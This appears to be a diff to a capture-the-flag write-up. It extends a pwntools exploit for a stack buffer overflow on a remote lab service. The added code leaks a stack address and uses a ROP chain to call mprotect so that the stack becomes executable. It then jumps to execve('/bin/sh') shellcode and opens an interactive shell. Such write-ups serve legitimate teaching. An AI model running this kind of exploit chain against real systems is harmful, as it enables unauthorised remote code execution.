@@ -53,10 +53,12 @@ Let's see what we have so far:
 3. We can leak the address of the end of the stack.
 4. We can make the stack executable.
 
-Let's see how the exploit looks until here
+Let's see how the exploit looks until here. After printing the leaked address we jump to main again to read another payload.
 
 ```python
 from pwn import *
+
+io = remote("10.10.101.248", 9010)
 
 stack_end_sym_addr = p64(0x004bfa70)
 
@@ -67,7 +69,6 @@ payload = b'A' * 40
 popRDIAddr = p64(0x40191a) #pop rdi; ret
 popRSIAddr = p64(0x40f4de) # pop rsi ; ret
 popRDXAddr = p64(0x40181f) # pop rdx ; ret
-jmpRSPAddr = p64(0x463c43) # jmp rsp
 
 payload += popRDIAddr
 payload += stack_end_sym_addr
@@ -76,4 +77,54 @@ payload += p64(0x00401e61) #main addr
 
 io.sendline(payload)
 endAddrOfStack = u64(io.recvline().strip().ljust(8, b'\x00'))
+```
+
+Now we should have the address of the end of the stack. Let's make the stack executable.
+
+```python
+pageAddress = endAddrOfStack & 0xffffffffffff0000 # change permission of 0x10000 bytes to be sure we include our payload
+
+io.recvuntil(" libc 😏")
+io.clean()
+
+# int mprotect (void * __addr, size_t __len, int __prot)
+#                   RDI             RSI         EDX
+payload = b'A' * 40
+
+payload += popRDIAddr
+payload += p64(pageAddress)
+
+payload += popRSIAddr
+payload += p64(0x10000) # length
+
+payload += popRDXAddr
+payload += p64(0x7) #permissions RWX
+
+payload += p64(0x00449b70) #mroptect addr
+```
+
+After executing the code above, if we look with the debugger we can see that we have the whole stack as `RWX`.
+
+![RWX](images/RWX.png)
+
+Now we can write and execute our shellcode, but how do we modify the IP to point to our shellcode? We can use the the following gadget:
+
+- `0x0000000000463c43 : jmp rsp`
+
+When exiting the `mprotect` function, we pop into RIP the address of the gadget above. Then if the shellcode is right after that address, RSP will point straight to it, because it got incremented during the RET instruction.
+
+For this exploit I have used a simple `execve(/bin/sh)` shellcode from [exploit-db](https://www.exploit-db.com/exploits/47008).
+
+Remotely I had to add an extra ret instruction for stack alignment.
+
+```python
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+
+jmpRSPAddr = p64(0x463c43) # jmp rsp
+payload += jmpRSPAddr
+payload += p64(0x00401eac) #ret for movaps allignment
+payload += shellcode
+
+io.sendline(payload)
+io.interactive()
 ```
